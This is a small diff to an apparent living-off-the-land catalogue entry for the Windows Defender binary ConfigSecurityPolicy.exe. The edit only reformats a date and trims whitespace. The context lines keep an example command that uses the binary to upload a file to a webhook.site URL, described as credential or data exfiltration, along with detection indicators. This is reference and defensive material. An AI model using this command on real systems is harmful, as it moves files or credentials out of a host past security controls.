@@ -2,7 +2,7 @@
 Name: ConfigSecurityPolicy.exe
 Description: Binary part of Windows Defender. Used to manage settings in Windows Defender. you can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.
 Author: 'Ialle Teixeira'
-Created: '04/09/2020'
+Created: 2020-09-04
 Commands:
   - Command: ConfigSecurityPolicy.exe C:\\Windows\\System32\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile
     Description: Upload file, credentials or data exfiltration in general
@@ -14,9 +14,9 @@ Commands:
     OperatingSystem: Windows 10
 Full_Path:
   - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe
-Code_Sample: 
-  - Code: 
-Detection: 
+Code_Sample:
+  - Code:
+Detection:
   - IOC: ConfigSecurityPolicy storing data into alternate data streams.
   - IOC: Preventing/Detecting ConfigSecurityPolicy with non-RFC1918 addresses by Network IPS/IDS.
   - IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching ConfigSecurityPolicy.exe.
